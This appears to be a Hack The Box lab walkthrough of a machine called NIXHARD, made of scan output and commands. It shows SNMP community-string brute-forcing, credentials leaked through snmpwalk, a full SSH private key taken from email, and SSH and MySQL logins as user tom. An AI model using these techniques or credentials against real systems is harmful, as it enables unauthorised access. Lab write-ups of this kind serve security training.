
# NMAP Fast Scan

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 08:34 EDT
Warning: 10.129.34.143 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.34.143
Host is up (0.050s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   open     ssh
110/tcp  open     pop3
143/tcp  open     imap
993/tcp  open     imaps
995/tcp  open     pop3s
2035/tcp filtered imsldoc
2811/tcp filtered gsiftp
3737/tcp filtered xpanel

Nmap done: 1 IP address (1 host up) scanned in 6.24 seconds
                                                                
```
## AutoRecon
```
┌──(kali㉿kali)-[~]
└─$ sudo autorecon 10.129.128.172
[sudo] password for kali: 
[*] Scanning target 10.129.128.172
[*] [10.129.128.172/all-tcp-ports] Discovered open port tcp/995 on 10.129.128.172
[*] [10.129.128.172/all-tcp-ports] Discovered open port tcp/993 on 10.129.128.172
[*] [10.129.128.172/all-tcp-ports] Discovered open port tcp/22 on 10.129.128.172
[*] [10.129.128.172/all-tcp-ports] Discovered open port tcp/143 on 10.129.128.172
[*] [10.129.128.172/all-tcp-ports] Discovered open port tcp/110 on 10.129.128.172
[*] [10.129.128.172/top-100-udp-ports] Discovered open port udp/161 on 10.129.128.172
[*] 08:59:20 - There is 1 scan still running against 10.129.128.172
[*] 09:00:20 - There is 1 scan still running against 10.129.128.172
[*] 09:01:20 - There is 1 scan still running against 10.129.128.172
[*] 09:02:20 - There is 1 scan still running against 10.129.128.172

```
## IMAPS Scan
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 08:37 EDT
Nmap scan report for 10.129.34.143
Host is up (0.046s latency).

PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_pop3-capabilities: AUTH-RESP-CODE TOP STLS CAPA USER UIDL RESP-CODES PIPELINING SASL(PLAIN)
143/tcp open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: LITERAL+ IMAP4rev1 ENABLE OK STARTTLS more AUTH=PLAINA0001 IDLE have SASL-IR ID post-login LOGIN-REFERRALS Pre-login capabilities listed
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: LITERAL+ IMAP4rev1 ENABLE OK Pre-login AUTH=PLAINA0001 IDLE more SASL-IR ID have LOGIN-REFERRALS post-login capabilities listed
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
995/tcp open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: UIDL CAPA TOP USER AUTH-RESP-CODE RESP-CODES PIPELINING SASL(PLAIN)
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.00 seconds
                                                                       
```


## SNMP
```
find /usr/share -name "snmp.txt" 
/usr/share/seclists/Discovery/SNMP/snmp.txt

sudo nmap -sU -p 161 --script=snmp-brute -Pn --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.128.172

`onesixtyone -c community-strings.list <FQDN/IP>


`sudo nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.129.128.172

onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.128.172

snmpwalk -c backup -v1 10.129.128.172
```
## SNMP Bruteforce
```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sU -p 161 --script=snmp-brute -Pn --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.128.172
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 08:57 EDT
Nmap scan report for 10.129.128.172
Host is up (0.052s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute: 
|_  backup - Valid credentials

Nmap done: 1 IP address (1 host up) scanned in 178.93 seconds

```
## SNMP Walk
```
 snmpwalk -c backup -v1 10.129.128.172
... 
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
...

```
## IMAP/POP3

- Using the credentials found above I logged into the email account using the evolution client
- Theres an email that contains an SSH Key
```
-----BEGIN OPENSSH PRIVATE KEY-----  
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  
-----END OPENSSH PRIVATE KEY-----

```

```
nano tom_rsa
"Paste Key"
save
chmod 600 tom_rsa
```

Using this SSH key we are able to login as Tom over SSH
```
kali㉿kali)-[~/Downloads]
└─$ ssh tom@10.129.128.172 -i tom_rsa    
The authenticity of host '10.129.128.172 (10.129.128.172)' can't be established.
ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.128.172' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 26 Sep 2024 01:16:28 PM UTC

  System load:  0.0               Processes:               170
  Usage of /:   70.0% of 5.40GB   Users logged in:         0
  Memory usage: 30%               IPv4 address for ens192: 10.129.128.172
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Nov 10 02:51:52 2021 from 10.10.14.20
tom@NIXHARD:~$ 

```
```
tom@NIXHARD:~$ ls -shila
total 48K
262851 4.0K drwxr-xr-x 6 tom  tom  4.0K Nov 10  2021 .
131076 4.0K drwxr-xr-x 5 root root 4.0K Nov 10  2021 ..
262855 4.0K -rw------- 1 tom  tom   532 Nov 10  2021 .bash_history
262853 4.0K -rw-r--r-- 1 tom  tom   220 Nov 10  2021 .bash_logout
262854 4.0K -rw-r--r-- 1 tom  tom  3.7K Nov 10  2021 .bashrc
262862 4.0K drwx------ 2 tom  tom  4.0K Nov 10  2021 .cache
262871 4.0K drwx------ 3 tom  tom  4.0K Nov 10  2021 mail
263603 4.0K drwx------ 8 tom  tom  4.0K Sep 26 13:12 Maildir
262349 4.0K -rw------- 1 tom  tom   169 Nov 10  2021 .mysql_history
262852 4.0K -rw-r--r-- 1 tom  tom   807 Nov 10  2021 .profile
262858 4.0K drwx------ 2 tom  tom  4.0K Nov 10  2021 .ssh
263614 4.0K -rw------- 1 tom  tom  2.0K Nov 10  2021 .viminfo

```
We see that there is mysql, so lets try and attempt to log in as tom

```
tom@NIXHARD:~$ mysql -u'tom' -p'NMds732Js2761' 
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.


mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.01 sec)

SELECT * FROM users;

|  150 | HTB               | cr3n4o7rzse7rzhnckhssncif7ds 

```